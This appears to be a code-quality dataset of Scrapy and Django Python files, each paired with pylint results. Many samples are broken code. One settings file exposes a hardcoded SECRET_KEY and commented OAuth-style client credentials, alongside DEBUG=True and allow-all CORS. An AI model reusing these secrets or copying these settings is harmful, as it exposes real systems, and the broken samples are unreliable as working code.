14       start_url=[""https://www.tutorialspoint.com/scrapy/index.htm""]
15   
16   def parse(self, response): 
17      l = ItemLoader(item = Product(), response = response)
18      l.add_xpath(""title"", ""//div[@class = 'product_title']"")
19      l.add_xpath(""title"", ""//div[@class = 'product_name']"")
20      l.add_xpath(""desc"", ""//div[@class = 'desc']"")
21      l.add_css(""size"", ""div#size]"")
22      l.add_value(""last_updated"", ""yesterday"")
23      return l.load_item()
24     # loader = ItemLoader(item = Item())
25     # loader.add_xpath('social''a[@class = ""social""]/@href')
26     # loader.add_xpath('email','a[@class = ""email""]/@href')
27   
28       # rules =(
29       #     Rule(LinkExtractor(allow=(),restrict_xpaths=('')))
30       # )
31   
32   class DemoSpider(CSVFeedSpider): 
33      name = ""demo"" 
34      allowed_domains = [""www.demoexample.com""] 
35      start_urls = [""http://www.demoexample.com/feed.csv""] 
36      delimiter = "";"" 
37      quotechar = ""'"" 
38      headers = [""product_title"", ""product_link"", ""product_description""]  
39      
40      def parse_row(self, response, row): 
41         self.logger.info(""This is row: %r"", row)  
42         item = DemoItem() 
43         item[""product_title""] = row[""product_title""] 
44         item[""product_link""] = row[""product_link""] 
45         item[""product_description""] = row[""product_description""] 
46         return item
47   
48   class DemoSpider(SitemapSpider): 
49      urls = [""http://www.demoexample.com/sitemap.xml""] 
50      
51      rules = [ 
52         (""/item/"", ""parse_item""), 
53         (""/group/"", ""parse_group""), 
54      ]  
55      
56      def parse_item(self, response): 
57         # you can scrap item here  
58      
59      def parse_group(self, response): 
60         # you can scrap group here ","59 - error: syntax-error
"
"1   from django.contrib import admin
2   
3   # Register your models here.
4   
5   
6   from blog.models import Tag, Article, Category
7   
8   
9   @admin.register(Article)
10   class ArticleAdmin(admin.ModelAdmin):
11       date_hierarchy = 'date_time'
12       list_display = ('title', 'category', 'author', 'date_time', 'view')
13       list_filter = ('category', 'author')
14       filter_horizontal = ('tag',)
15   
16   
17   @admin.register(Category)
18   class CategoryAdmin(admin.ModelAdmin):
19       pass
20   
21   
22   @admin.register(Tag)
23   class TagAdmin(admin.ModelAdmin):
24       pass
","10 - refactor: too-few-public-methods
18 - refactor: too-few-public-methods
23 - refactor: too-few-public-methods
"
"1   # -*- coding: utf-8 -*-
2   from __future__ import unicode_literals
3   
4   from django.db import migrations, models
5   
6   
7   class Migration(migrations.Migration):
8   
9       dependencies = [
10           ('scrapyproject', '0004_pipeline_pipeline_function'),
11       ]
12   
13       operations = [
14           migrations.RemoveField(
15               model_name='project',
16               name='settings',
17           ),
18           migrations.AddField(
19               model_name='project',
20               name='settings_link_generator',
21               field=models.TextField(blank=True),
22           ),
23           migrations.AddField(
24               model_name='project',
25               name='settings_scraper',
26               field=models.TextField(blank=True),
27           ),
28       ]
","7 - refactor: too-few-public-methods
"
"1   
2   import scrapy
3   
4   
5   class FirstScrapyItem(scrapy.Item):
6       # define the fields for your item here like:
7   
8       item=DmozItem()
9       
10       item ['title'] = scrapy.Field()
11       item ['url'] = scrapy.Field() 
12       item ['desc'] = scrapy.Field() 
13       ","8 - error: undefined-variable
5 - refactor: too-few-public-methods
"
"1   from django.http import HttpResponse, Http404
2   from django.shortcuts import render
3   import datetime
4   from django.http import HttpResponseRedirect
5   from django.core.mail import send_mail
6   from django.contrib.auth.views import login as loginview
7   from registration.backends.simple import views
8   from django.contrib.auth import authenticate, get_user_model, login
9   from registration import signals
10   from scrapyproject.views import mongodb_user_creation, linux_user_creation
11   from scrapyproject.scrapy_packages import settings
12   try:
13       # Python 3
14       from urllib.parse import urlparse
15   except ImportError:
16       # Python 2
17       from urlparse import urlparse
18   
19   try:
20       from urllib.parse import quote
21   except:
22       from urllib import quote
23   
24   User = get_user_model()
25   
26   
27   class MyRegistrationView(views.RegistrationView):
28       def register(self, form):
29           new_user = form.save()
30           new_user = authenticate(
31               username=getattr(new_user, User.USERNAME_FIELD),
32               password=form.cleaned_data['password1']
33           )
34   
35           #perform additional account creation here (MongoDB, local Unix accounts, etc.)
36   
37           mongodb_user_creation(getattr(new_user, User.USERNAME_FIELD), form.cleaned_data['password1'])
38   
39           if settings.LINUX_USER_CREATION_ENABLED:
40               try:
41                   linux_user_creation(getattr(new_user, User.USERNAME_FIELD), form.cleaned_data['password1'])
42               except:
43                   pass
44   
45           login(self.request, new_user)
46           signals.user_registered.send(sender=self.__class__,
47                                        user=new_user,
48                                        request=self.request)
49           return new_user
50   
51       def get_success_url(self, user):
52           return ""/project""
53   
54   
55   def custom_login(request):
56       if request.user.is_authenticated():
57           return HttpResponseRedirect('/project')
58       else:
59           return loginview(request)
60   
61   
62   def custom_register(request):
63       if request.user.is_authenticated():
64           return HttpResponseRedirect('/project')
65       else:
66           register = MyRegistrationView.as_view()
67           return register(request)
","21 - warning: bare-except
42 - warning: bare-except
51 - warning: unused-argument
56 - refactor: no-else-return
63 - refactor: no-else-return
1 - warning: unused-import
1 - warning: unused-import
2 - warning: unused-import
3 - warning: unused-import
5 - warning: unused-import
14 - warning: unused-import
20 - warning: unused-import
"
"1   # -*- coding: utf-8 -*-
2   """"""
3   -------------------------------------------------
4      File Name：     models.py
5      Description :
6      Author :       JHao
7      date：          2016/11/18
8   -------------------------------------------------
9      Change Activity:
10                      2016/11/18:
11   -------------------------------------------------
12   """"""
13   
14   from django.db import models
15   from django.conf import settings
16   
17   
18   # Create your models here.
19   
20   class Tag(models.Model):
21       tag_name = models.CharField('标签名称', max_length=30)
22   
23       def __str__(self):
24           return self.tag_name
25   
26   
27   class Article(models.Model):
28       title = models.CharField(max_length=200)  # 博客标题
29       category = models.ForeignKey('Category', verbose_name='文章类型', on_delete=models.CASCADE)
30       date_time = models.DateField(auto_now_add=True)  # 博客日期
31       content = models.TextField(blank=True, null=True)  # 文章正文
32       digest = models.TextField(blank=True, null=True)  # 文章摘要
33       author = models.ForeignKey(settings.AUTH_USER_MODEL, verbose_name='作者', on_delete=models.CASCADE)
34       view = models.BigIntegerField(default=0)  # 阅读数
35       comment = models.BigIntegerField(default=0)  # 评论数
36       picture = models.CharField(max_length=200)  # 标题图片地址
37       tag = models.ManyToManyField(Tag)  # 标签
38   
39       def __str__(self):
40           return self.title
41   
42       def sourceUrl(self):
43           source_url = settings.HOST + '/blog/detail/{id}'.format(id=self.pk)
44           return source_url  # 给网易云跟帖使用
45   
46       def viewed(self):
47           """"""
48           增加阅读数
49           :return:
50           """"""
51           self.view += 1
52           self.save(update_fields=['view'])
53   
54       def commenced(self):
55           """"""
56           增加评论数
57           :return:
58           """"""
59           self.comment += 1
60           self.save(update_fields=['comment'])
61   
62       class Meta:  # 按时间降序
63           ordering = ['-date_time']
64   
65   
66   class Category(models.Model):
67       name = models.CharField('文章类型', max_length=30)
68       created_time = models.DateTimeField('创建时间', auto_now_add=True)
69       last_mod_time = models.DateTimeField('修改时间', auto_now=True)
70   
71       class Meta:
72           ordering = ['name']
73           verbose_name = ""文章类型""
74           verbose_name_plural = verbose_name
75   
76       def __str__(self):
77           return self.name
78   
79   
80   class Comment(models.Model):
81       title = models.CharField(""标题"", max_length=100)
82       source_id = models.CharField('文章id或source名称', max_length=25)
83       create_time = models.DateTimeField('评论时间', auto_now=True)
84       user_name = models.CharField('评论用户', max_length=25)
85       url = models.CharField('链接', max_length=100)
86       comment = models.CharField('评论内容', max_length=500)
","20 - refactor: too-few-public-methods
62 - refactor: too-few-public-methods
71 - refactor: too-few-public-methods
66 - refactor: too-few-public-methods
80 - refactor: too-few-public-methods
"
"1   from django.contrib.syndication.views import Feed
2   from django.template.defaultfilters import truncatewords
3   from django.urls import reverse_lazy
4   from .models import Post
5   
6   
7   
8   class LatestPostsFeed(Feed):
9       title ='My Blog'
10       link=reverse_lazy('post_list')
11       description = 'new post of my Blog.'
12       
13   
14       def  items(self):
15           return Post.published.all()[:5]
16   
17       def  item_title(self, item):
18           return super().item_title(item)    
19   
20   
21       def item_description(self, item):
22           return truncatewords(item.body,30)     
","4 - error: relative-beyond-top-level
17 - warning: useless-parent-delegation
"
"1   from django.conf.urls import include, url
2   from . import views
3   
4   urlpatterns = [
5       url(r'^$', views.main_page, name=""mainpage""),
6       url(r'^create/$', views.create_new, name=""newproject""),
7       url(r'^manage/(?P<projectname>[\w]+)/', views.manage_project, name=""manageproject""),
8       url(r'^delete/(?P<projectname>[\w]+)/', views.delete_project, name=""deleteproject""),
9       url(r'^createitem/(?P<projectname>[\w]+)/', views.create_item, name=""newitem""),
10       url(r'^edititems/(?P<projectname>[\w]+)/', views.itemslist, name=""listitems""),
11       url(r'^deleteitem/(?P<projectname>[\w]+)/(?P<itemname>[\w]+)/', views.deleteitem, name=""deleteitem""),
12       url(r'^edititem/(?P<projectname>[\w]+)/(?P<itemname>[\w]+)/', views.edititem, name=""edititem""),
13       url(r'^addpipeline/(?P<projectname>[\w]+)/', views.addpipeline, name=""addpipeline""),
14       url(r'^editpipelines/(?P<projectname>[\w]+)/', views.pipelinelist, name=""listpipelines""),
15       url(r'^editpipeline/(?P<projectname>[\w]+)/(?P<pipelinename>[\w]+)/', views.editpipeline, name=""editpipeline""),
16       url(r'^deletepipeline/(?P<projectname>[\w]+)/(?P<pipelinename>[\w]+)/', views.deletepipeline, name=""deletepipeline""),
17       url(r'^linkgenerator/(?P<projectname>[\w]+)/', views.linkgenerator, name=""linkgenerator""),
18       url(r'^scraper/(?P<projectname>[\w]+)/', views.scraper, name=""scraper""),
19       url(r'^deploy/(?P<projectname>[\w]+)/', views.deploy, name='deploy'),
20       url(r'^changepassword/$', views.change_password, name=""changepass""),
21       url(r'^deploystatus/(?P<projectname>[\w]+)/', views.deployment_status, name=""deploystatus""),
22       url(r'^startproject/(?P<projectname>[\w]+)/(?P<worker>[\w]+)/', views.start_project, name=""startproject""),
23       url(r'^stopproject/(?P<projectname>[\w]+)/(?P<worker>[\w]+)/', views.stop_project, name=""stopproject""),
24       url(r'^allworkerstatus/(?P<projectname>[\w]+)/', views.get_project_status_from_all_workers, name=""allworkerstatus""),
25       url(r'^getlog/(?P<projectname>[\w]+)/(?P<worker>[\w]+)/', views.see_log_file, name=""seelogfile""),
26       url(r'^allprojectstatus/', views.gather_status_for_all_projects, name=""allprojectstatus""),
27       url(r'^editsettings/(?P<settingtype>[\w]+)/(?P<projectname>[\w]+)/', views.editsettings, name=""editsettings""),
28       url(r'^startonall/(?P<projectname>[\w]+)/', views.start_project_on_all, name=""startonall""),
29       url(r'^stoponall/(?P<projectname>[\w]+)/', views.stop_project_on_all, name=""stoponall""),
30       url(r'^globalstatus/', views.get_global_system_status, name=""globalstatus""),
31       url(r'^sharedb/(?P<projectname>[\w]+)/', views.share_db, name=""sharedatabase""),
32       url(r'^shareproject/(?P<projectname>[\w]+)/', views.share_project, name=""shareproject""),
33       url(r'^dbpreview/(?P<db>[\w]+)/', views.database_preview, name=""dbpreview""),
34   ]","2 - error: no-name-in-module
1 - warning: unused-import
"
"1   from django import forms
2   from crispy_forms.helper import FormHelper
3   from crispy_forms.layout import Submit
4   from django.contrib.auth.forms import PasswordChangeForm
5   
6   
7   class CreateProject(forms.Form):
8       projectname = forms.SlugField(label=""Enter project name"", max_length=50, required=True)
9       helper = FormHelper()
10       helper.form_method = 'POST'
11       helper.add_input(Submit('submit', 'Create Project'))
12       helper.add_input(Submit('cancel', 'Cancel', css_class='btn-default'))
13   
14   
15   class DeleteProject(forms.Form):
16       helper = FormHelper()
17       helper.form_method = 'POST'
18       helper.add_input(Submit('submit', 'Confirm'))
19       helper.add_input(Submit('cancel', 'Cancel', css_class='btn-default'))
20   
21   
22   class CreatePipeline(forms.Form):
23       pipelinename = forms.SlugField(label=""Pipeline name"", max_length=50, required=True)
24       pipelineorder = forms.IntegerField(label=""Order"", required=True, min_value=1, max_value=900)
25       pipelinefunction = forms.CharField(label=""Pipeline function:"", required=False, widget=forms.Textarea)
26       helper = FormHelper()
27       helper.form_tag = False
28   
29   
30   class LinkGenerator(forms.Form):
31       function = forms.CharField(label=""Write your link generator function here:"", required=False, widget=forms.Textarea)
32       helper = FormHelper()
33       helper.form_tag = False
34   
35   
36   class Scraper(forms.Form):
37       function = forms.CharField(label=""Write your scraper function here:"", required=False, widget=forms.Textarea)
38       helper = FormHelper()
39       helper.form_tag = False
40   
41   
42   class ItemName(forms.Form):
43       itemname = forms.SlugField(label=""Enter item name"", max_length=50, required=True)
44       helper = FormHelper()
45       helper.form_tag = False
46   
47   
48   class FieldName(forms.Form):
49       fieldname = forms.SlugField(label=""Field 1"", max_length=50, required=False)
50       extra_field_count = forms.CharField(widget=forms.HiddenInput())
51       helper = FormHelper()
52       helper.form_tag = False
53   
54       def __init__(self, *args, **kwargs):
55           extra_fields = kwargs.pop('extra', 0)
56   
57           super(FieldName, self).__init__(*args, **kwargs)
58           self.fields['extra_field_count'].initial = extra_fields
59   
60           for index in range(int(extra_fields)):
61               # generate extra fields in the number specified via extra_fields
62               self.fields['field_{index}'.format(index=index+2)] = forms.CharField(required=False)
63   
64   
65   class ChangePass(PasswordChangeForm):
66       helper = FormHelper()
67       helper.form_method = 'POST'
68       helper.add_input(Submit('submit', 'Change'))
69   
70   
71   class Settings(forms.Form):
72       settings = forms.CharField(required=False, widget=forms.Textarea)
73       helper = FormHelper()
74       helper.form_tag = False
75   
76   
77   class ShareDB(forms.Form):
78       username = forms.CharField(label=""Enter the account name for the user with whom you want to share the database"", max_length=150, required=True)
79       helper = FormHelper()
80       helper.form_method = 'POST'
81       helper.add_input(Submit('submit', 'Share'))
82       helper.add_input(Submit('cancel', 'Cancel', css_class='btn-default'))
83   
84   
85   class ShareProject(forms.Form):
86       username = forms.CharField(label=""Enter the account name for the user with whom you want to share the project"", max_length=150, required=True)
87       helper = FormHelper()
88       helper.form_method = 'POST'
89       helper.add_input(Submit('submit', 'Share'))
90       helper.add_input(Submit('cancel', 'Cancel', css_class='btn-default'))","7 - refactor: too-few-public-methods
15 - refactor: too-few-public-methods
22 - refactor: too-few-public-methods
30 - refactor: too-few-public-methods
36 - refactor: too-few-public-methods
42 - refactor: too-few-public-methods
57 - refactor: super-with-arguments
48 - refactor: too-few-public-methods
65 - refactor: too-few-public-methods
71 - refactor: too-few-public-methods
77 - refactor: too-few-public-methods
85 - refactor: too-few-public-methods
"
"1   # -*- coding: utf-8 -*-
2   BOT_NAME = 'tc_zufang'
3   
4   SPIDER_MODULES = ['tc_zufang.spiders']
5   NEWSPIDER_MODULE = 'tc_zufang.spiders'
6   
7   # Crawl responsibly by identifying yourself (and your website) on the user-agent
8   #USER_AGENT = 'tc_zufang (+http://www.yourdomain.com)'
9   #item Pipeline同时处理item的最大值为100
10   # CONCURRENT_ITEMS=100
11   #scrapy downloader并发请求最大值为16
12   #CONCURRENT_REQUESTS=4
13   #对单个网站进行并发请求的最大值为8
14   #CONCURRENT_REQUESTS_PER_DOMAIN=2
15   #抓取网站的最大允许的抓取深度值
16   DEPTH_LIMIT=0
17   # Obey robots.txt rules
18   ROBOTSTXT_OBEY = True
19   DOWNLOAD_TIMEOUT=10
20   DNSCACHE_ENABLED=True
21   #避免爬虫被禁的策略1，禁用cookie
22   # Disable cookies (enabled by default)
23   COOKIES_ENABLED = False
24   CONCURRENT_REQUESTS=4
25   #CONCURRENT_REQUESTS_PER_IP=2
26   #CONCURRENT_REQUESTS_PER_DOMAIN=2
27   #设置下载延时，防止爬虫被禁
28   DOWNLOAD_DELAY = 5
29   DOWNLOADER_MIDDLEWARES = {
30       'scrapy.contrib.downloadermiddleware.httpproxy.HttpProxyMiddleware': 110,
31       ""tc_zufang.Proxy_Middleware.ProxyMiddleware"":100,
32       'scrapy.downloadermiddlewares.robotstxt.RobotsTxtMiddleware': 100,
33       'scrapy.downloadermiddlewares.defaultheaders.DefaultHeadersMiddleware': 550,
34       'scrapy.downloadermiddlewares.ajaxcrawl.AjaxCrawlMiddleware': 560,
35       'scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware': 590,
36       'scrapy.downloadermiddlewares.chunked.ChunkedTransferMiddleware': 830,
37       'scrapy.downloadermiddlewares.stats.DownloaderStats': 850,
38       'tc_zufang.timeout_middleware.Timeout_Middleware':610,
39       'scrapy.downloadermiddlewares.httpauth.HttpAuthMiddleware': None,
40       'scrapy.downloadermiddlewares.useragent.UserAgentMiddleware': 300,
41       'scrapy.downloadermiddlewares.retry.RetryMiddleware': None,
42       'scrapy.downloadermiddlewares.redirect.MetaRefreshMiddleware': None,
43       'scrapy.downloadermiddlewares.redirect.RedirectMiddleware': 400,
44       'scrapy.downloadermiddlewares.cookies.CookiesMiddleware': None,
45       'scrapy.downloadermiddlewares.httpcache.HttpCacheMiddleware': None,
46       'tc_zufang.rotate_useragent_dowmloadmiddleware.RotateUserAgentMiddleware':400,
47       'tc_zufang.redirect_middleware.Redirect_Middleware':500,
48   
49   }
50   #使用scrapy-redis组件，分布式运行多个爬虫
51   
52   
53   #配置日志存储目录
54   SCHEDULER = ""scrapy_redis.scheduler.Scheduler""
55   DUPEFILTER_CLASS = ""scrapy_redis.dupefilter.RFPDupeFilter""
56   SCHEDULER_PERSIST = True
57   SCHEDULER_QUEUE_CLASS = 'scrapy_redis.queue.SpiderPriorityQueue'
58   REDIS_URL = None
59   REDIS_HOST = '127.0.0.1' # 也可以根据情况改成 localhost
60   REDIS_PORT = '6379'
61   #LOG_FILE = ""logs/scrapy.log""
62   
","Clean Code: No Issues Detected
"
"1   import connection
2   import queue
3   from scrapy.utils.misc import load_object
4   from scrapy.utils.job import job_dir
5   
6   SCHEDULER_PERSIST = False
7   QUEUE_CLASS = 'queue.SpiderQueue'
8   IDLE_BEFORE_CLOSE = 0
9   
10   
11   class Scheduler(object):
12   
13       def __init__(self, server, persist,
14                    queue_key, queue_cls, idle_before_close,
15                    stats, *args, **kwargs):
16           self.server = server
17           self.persist = persist
18           self.queue_key = queue_key
19           self.queue_cls = queue_cls
20           self.idle_before_close = idle_before_close
21           self.stats = stats
22   
23       def __len__(self):
24           return len(self.queue)
25   
26       @classmethod
27       def from_crawler(cls, crawler):
28           if not crawler.spider.islinkgenerator:
29               settings = crawler.settings
30               persist = settings.get('SCHEDULER_PERSIST', SCHEDULER_PERSIST)
31               queue_key = ""%s:requests"" % crawler.spider.name
32               queue_cls = queue.SpiderQueue
33               idle_before_close = settings.get('SCHEDULER_IDLE_BEFORE_CLOSE', IDLE_BEFORE_CLOSE)
34               server = connection.from_settings(settings, crawler.spider.name)
35               stats = crawler.stats
36               return cls(server, persist, queue_key, queue_cls, idle_before_close, stats)
37           else:
38               settings = crawler.settings
39               dupefilter_cls = load_object(settings['DUPEFILTER_CLASS'])
40               dupefilter = dupefilter_cls.from_settings(settings)
41               pqclass = load_object(settings['SCHEDULER_PRIORITY_QUEUE'])
42               dqclass = load_object(settings['SCHEDULER_DISK_QUEUE'])
43               mqclass = load_object(settings['SCHEDULER_MEMORY_QUEUE'])
44               logunser = settings.getbool('LOG_UNSERIALIZABLE_REQUESTS', settings.getbool('SCHEDULER_DEBUG'))
45               core_scheduler = load_object('scrapy.core.scheduler.Scheduler')
46               return core_scheduler(dupefilter, jobdir=job_dir(settings), logunser=logunser,
47                      stats=crawler.stats, pqclass=pqclass, dqclass=dqclass, mqclass=mqclass)
48   
49       def open(self, spider):
50           self.spider = spider
51           self.queue = self.queue_cls(self.server, spider, self.queue_key)
52   
53           if len(self.queue):
54               spider.log(""Resuming crawl (%d requests scheduled)"" % len(self.queue))
55   
56       def close(self, reason):
57           if not self.persist:
58               self.queue.clear()
59           connection.close(self.server)
60   
61       def enqueue_request(self, request):
62           if self.stats:
63               self.stats.inc_value('scheduler/enqueued/rabbitmq', spider=self.spider)
64           self.queue.push(request)
65   
66       def next_request(self):
67           request = self.queue.pop()
68           if request and self.stats:
69               self.stats.inc_value('scheduler/dequeued/rabbitmq', spider=self.spider)
70           return request
71   
72       def has_pending_requests(self):
73           return len(self) > 0
","11 - refactor: useless-object-inheritance
11 - refactor: too-many-instance-attributes
13 - refactor: too-many-arguments
13 - refactor: too-many-positional-arguments
13 - warning: unused-argument
13 - warning: unused-argument
27 - refactor: too-many-locals
28 - refactor: no-else-return
32 - error: no-member
56 - warning: unused-argument
50 - warning: attribute-defined-outside-init
51 - warning: attribute-defined-outside-init
"
"1   # -*- coding: utf-8 -*-
2   
3   # Define your item pipelines here
4   #
5   # Don't forget to add your pipeline to the ITEM_PIPELINES setting
6   # See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html
7   
8   
9   class PropertiesPipeline(object):
10       def process_item(self, item, spider):
11           return item
12   
13   
14   ITEM_PIPELINES = {
15   
16   'scrapy.pipelines.images.ImagesPipeline': 1,
17   'properties.pipelines.geo.GeoPipeline': 400,
18   }
19   IMAGES_STORE = 'images'
20   IMAGES_THUMBS = { 'small': (30, 30) }","9 - refactor: useless-object-inheritance
10 - warning: unused-argument
9 - refactor: too-few-public-methods
"
"1   from scrapy.loader.processors import MapCompose, Join
2   from scrapy.loader import ItemLoader
3   from properties.items import PropertiesItem
4   import datetime
5   from urllib.parse import urlparse
6   import socket
7   
8   import scrapy
9   
10   class BasicSpider(scrapy.Spider):
11       name = ""basictest""
12       allowed_domains = [""web""]
13       start_urls=(
14           'https://developers.facebook.com/blog/post/2021/01/26/introducing-instagram-content-publishing-api/?utm_source=email&utm_medium=fb4d-newsletter-february21&utm_campaign=organic&utm_offering=business-tools&utm_product=instagram&utm_content=body-button-instagram-graph-API&utm_location=2',
15            )
16   
17       def parse (self,response):
18          """""" @url https://developers.facebook.com/blog/post/2021/01/26/introducing-instagram-content-publishing-api/?utm_source=email&utm_medium=fb4d-newsletter-february21&utm_campaign=organic&utm_offering=business-tools&utm_product=instagram&utm_content=body-button-instagram-graph-API&utm_location=2
19           @return item 1
20           @scrapes title price
21           @scrapes url project""""""
22   
23   
24       l = ItemLoader(item=PropertiesItem(), response=response)
25       # Load fields using XPath expressions
26       l.add_xpath('title', '/html/body/div[1]/div[5]/div[2]/div/div/div/div[2]/div[2]/div[2]/div[1]/div/div/div[2]/div/div/p[1]/text()',
27               MapCompose(unicode.strip, unicode.title))
28       # l.add_xpath('price', './/*[@itemprop=""price""][1]/text()',
29       # MapCompose(lambda i: i.replace(',', ''),
30       # float),
31       # re='[,.0-9]+')
32       # l.add_xpath('description', '//*[@itemprop=""description""]'
33       # '[1]/text()',
34       # MapCompose(unicode.strip), Join())
35       
36       # Housekeeping fields
37       l.add_value('url', response.url)
38       l.add_value('project', self.settings.get('BOT_NAME'))
39       l.add_value('spider', self.name)
40       l.add_value('server', socket.gethostname())
41       l.add_value('date', datetime.datetime.now())
42       return l.load_item()","18 - warning: bad-indentation
24 - error: undefined-variable
27 - error: undefined-variable
27 - error: undefined-variable
37 - error: undefined-variable
38 - error: undefined-variable
39 - error: undefined-variable
42 - error: return-outside-function
10 - refactor: too-few-public-methods
1 - warning: unused-import
5 - warning: unused-import
"
"1   from scrapy.item import Item, Field
2   
3   import datetime 
4   import socket
5   
6   
7   class PropertiesItem(Item):
8       # Primary fields
9       title = PropertiesItem()
10       price = Field()
11       description = Field()
12       address = Field()
13       image_urls = Field()
14       # Calculated fields
15       images = Field()
16       location = Field()
17       # Housekeeping fields
18       
19       l.add_value('url', response.url)
20       l.add_value('project', self.settings.get('BOT_NAME'))
21       l.add_value('spider', self.name)
22       l.add_value('server', socket.gethostname())
23       l.add_value('date', datetime.datetime.now())
24   
25   
26   
27       return l.load_item()","9 - error: undefined-variable
19 - error: undefined-variable
19 - error: undefined-variable
20 - error: undefined-variable
20 - error: undefined-variable
21 - error: undefined-variable
21 - error: undefined-variable
22 - error: undefined-variable
23 - error: undefined-variable
27 - error: return-outside-function
27 - error: undefined-variable
7 - refactor: too-few-public-methods
"
"1   
2   
3   import os
4   
5   BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
6   SECRET_KEY = 'f!7k7a9k10)fbx7#@y@u9u@v3%b)f%h6xxnxf71(21z1uj^#+e'
7   DEBUG = True
8   ALLOWED_HOSTS = []
9   
10   INSTALLED_APPS = [
11       'django.contrib.admin',
12       'django.contrib.auth',
13       'django.contrib.contenttypes',
14       'django.contrib.sessions',
15       'django.contrib.messages',
16       'django.contrib.staticfiles',
17       'users',
18       # 'oauth2_provider',
19       # 'oauth2_provider',
20       'corsheaders',
21       'django.contrib.sites.apps.SitesConfig',
22       'django.contrib.humanize.apps.HumanizeConfig',
23       'django_nyt.apps.DjangoNytConfig',
24       'mptt',
25       'sekizai',
26       'sorl.thumbnail',
27       'wiki.apps.WikiConfig',
28       'wiki.plugins.attachments.apps.AttachmentsConfig',
29       'wiki.plugins.notifications.apps.NotificationsConfig',
30       'wiki.plugins.images.apps.ImagesConfig',
31       'wiki.plugins.macros.apps.MacrosConfig',
32   ]
33   
34   # AUTHENTICATION_BACKENDS = (
35   #     'oauth2_provider.backends.OAuth2Backend',
36   #     # Uncomment following if you want to access the admin
37   #     #'django.contrib.auth.backends.ModelBackend'
38       
39   # )
40   MIDDLEWARE = [
41       'django.contrib.auth.middleware.SessionAuthenticationMiddleware',
42       'oauth2_provider.middleware.OAuth2TokenMiddleware',
43       'corsheaders.middleware.CorsMiddleware',
44       'django.middleware.security.SecurityMiddleware',
45       'django.contrib.sessions.middleware.SessionMiddleware',
46       'django.middleware.common.CommonMiddleware',
47       'django.middleware.csrf.CsrfViewMiddleware',
48       'django.contrib.auth.middleware.AuthenticationMiddleware',
49       'django.contrib.messages.middleware.MessageMiddleware',
50       'django.middleware.clickjacking.XFrameOptionsMiddleware',
51   ]
52   
53   ROOT_URLCONF = 'iam.urls'
54   
55   TEMPLATES = [
56       {
57           'BACKEND': 'django.template.backends.django.DjangoTemplates',
58           'DIRS': [],
59           'APP_DIRS': True,
60             'OPTIONS': {
61               'context_processors': [
62                   'django.contrib.auth.context_processors.auth',
63                   'django.template.context_processors.debug',
64                   'django.template.context_processors.i18n',
65                   'django.template.context_processors.media',
66                   'django.template.context_processors.request',
67                   'django.template.context_processors.static',
68                   'django.template.context_processors.tz',
69                   'django.contrib.messages.context_processors.messages',
70                   ""sekizai.context_processors.sekizai"",
71               ],
72           },
73       },
74   ]
75   
76   WSGI_APPLICATION = 'iam.wsgi.application'
77   
78   
79   DATABASES = {
80       'default': {
81           'ENGINE': 'django.db.backends.sqlite3',
82           'NAME': os.path.join(BASE_DIR, 'db.sqlite3'),
83       }
84   }
85   
86   
87   AUTH_PASSWORD_VALIDATORS = [
88       {
89           'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',
90       },
91       {
92           'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',
93       },
94       {
95           'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',
96       },
97       {
98           'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',
99       },
100   ]
101   
102   
103   # Internationalization
104   # https://docs.djangoproject.com/en/2.2/topics/i18n/
105   
106   LANGUAGE_CODE = 'en-us'
107   
108   TIME_ZONE = 'UTC'
109   
110   USE_I18N = True
111   
112   USE_L10N = True
113   
114   USE_TZ = True
115   SITE_ID = 1
116   
117   # Static files (CSS, JavaScript, Images)
118   # https://docs.djangoproject.com/en/2.2/howto/static-files/
119   
120   STATIC_URL = '/static/'
121   AUTH_USER_MODEL='users.User'
122   LOGIN_URL='/admin/login/'
123   
124   CORS_ORIGIN_ALLOW_ALL = True
125   
126   WIKI_ACCOUNT_HANDLING = True
127   WIKI_ACCOUNT_SIGNUP_ALLOWED = True
128   
129   # export ID =vW1RcAl7Mb0d5gyHNQIAcH110lWoOW2BmWJIero8
130   # export SECRET=DZFpuNjRdt5xUEzxXovAp40bU3lQvoMvF3awEStn61RXWE0Ses4RgzHWKJKTvUCHfRkhcBi3ebsEfSjfEO96vo2Sh6pZlxJ6f7KcUbhvqMMPoVxRwv4vfdWEoWMGPeIO
131   # # ","Clean Code: No Issues Detected
"
"1   from django.apps import AppConfig
2   
3   
4   class CorescrapConfig(AppConfig):
5       name = 'corescrap'
","4 - refactor: too-few-public-methods
"
"1   import scrapy
2   from properties.items import PropertiesItem
3   from scrapy.loader import ItemLoader
4   from itemloaders.processors import  MapCompose, Join
5   class BasicSpider(scrapy.Spider):
6       name = 'basic'
7       allowed_domains = ['web']
8       start_urls = ['http://web:9312/properties/property_000000.html']
9   
10       def parse(self, response):   
11           #Cleaning up – item loaders and housekeeping fields
12           l = ItemLoader(item=PropertiesItem(), response=response)
13           l.add_xpath(""title"", '//*[@itemprop=""name""][1]/text()' ,MapCompose(unicode.strip, unicode.title))
14           l.add_xpath(""price"", '//*[@itemprop=""price""][1]/text()',MapCompose(lambda i: i.replace(',', ''), float),re('[0.9]+')
15           l.add_xpath(""description"", '//*[@itemprop=""description""][1]/text()', MapCompose(unicode.strip), Join())
16           l.add_xpath(""address "", '//*[@itemtype=""http://schema.org/Place""][1]/text()',MapCompose(unicode.strip))
17           l.add_xpath(""image_urls"", '//*[@itemprop=""image""][1]/@src', MapCompose(lambda i: urlparse.urljoin(response.url, i)))
18   
19           return l.load_item()
20   
21   
22   
23   
24       # def parse(self, response):
25       #     item = PropertiesItem()        
26       #     item['title'] = response.xpath(
27       #         '//*[@itemprop=""list-group-item""][1]/text()').extract()
28       #     item['price'] = response.xpath('//*[@itemprop=""price""][1]/text()').re('[.0-9]+')        
29       #     item['description'] = response.xpath('//*[@itemprop=""description""][1]/text()').extract()
30           
31   
32           # return item
33       # def parse(self, response):
34       #     self.log(""title:%s""%response.xpath(
35       #         '//*[@itemprop=""name""][1]/text()').extract()
36       #     )
37       #     self.log(""price:%s"" % response.xpath(
38       #         '//*[@itemprop=""price""][1]/text()').re('[0.9]+'))
39       #     self.log(""description: %s"" % response.xpath(
40       #         '//*[@itemprop=""description""][1]/text()').extract())
41       #     self.log(""address: %s"" % response.xpath(
